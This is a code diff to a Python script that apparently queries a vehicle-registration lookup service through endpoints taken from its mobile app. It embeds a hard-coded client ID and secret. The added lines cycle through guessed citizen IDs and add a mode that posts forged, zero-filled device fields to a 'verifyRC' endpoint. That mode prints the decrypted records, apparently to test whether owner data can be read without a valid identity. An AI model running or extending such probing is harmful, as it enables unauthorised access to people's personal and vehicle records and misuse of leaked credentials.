@@ -34,6 +34,7 @@ SEND_OTP_EP   = "service/forwardOTPAlerts"
 VERIFY_OTP_EP = "service/validateOTPAlerts"
 LOGIN_EP      = "service/getUserLoginToken"
 RC_LOOKUP_EP  = "service/getSearchDocDetails"
+RC_VERIFY_EP  = "service/verifyRC"
 CLIENT_ID     = "b91c303443f61b37106750823881cd2f"
 CLIENT_SECRET = "de83eeeb148878ae375f28756492e8a0"
 PAYMENT_SUFFIX = "!~)#@*&^"
@@ -357,7 +358,31 @@ def main():
         citizen_id = int(sys.argv[3]) if len(sys.argv) > 3 else 1
         bearer     = fetch_token()
         if bearer:
-            lookup_rc(rc, bearer, citizen_id)
+            for cid in ([citizen_id] if citizen_id != 1 else [0, 1, 1000, 100000]):
+                lookup_rc(rc, bearer, cid)
+        sys.exit(0)
+
+    # verifyRC mode (anonymous violation reporting — may not need real citizenId)
+    if sys.argv[1] == "--verify":
+        rc     = sys.argv[2] if len(sys.argv) > 2 else "WB74AN9717"
+        bearer = fetch_token()
+        if bearer:
+            ts    = str(int(time.time() * 1000))
+            plain = json.dumps({"rcNumber": rc, "recordId": 1, "did": "0000000000000000", "mid": "0000000000", "tid": ""}, separators=(",", ":"))
+            wire  = json.dumps({"data": encrypt_body(plain, ts)})
+            print(f"\nTrying verifyRC for {rc} ...")
+            raw = curl_post_json(NRAPI_BASE + RC_VERIFY_EP, wire, {
+                "timestamp": ts, "Param2": "2.0.135", "Param1": "1",
+                "Authorization": f"Bearer {bearer}",
+            })
+            try:
+                rj = json.loads(raw)
+                if "data" in rj:
+                    print("DECRYPTED:", decrypt_response(rj["data"], ts))
+                else:
+                    print("RESPONSE:", json.dumps(rj)[:500])
+            except Exception:
+                print("RAW:", raw[:500])
         sys.exit(0)
 
     mobile = sys.argv[1]
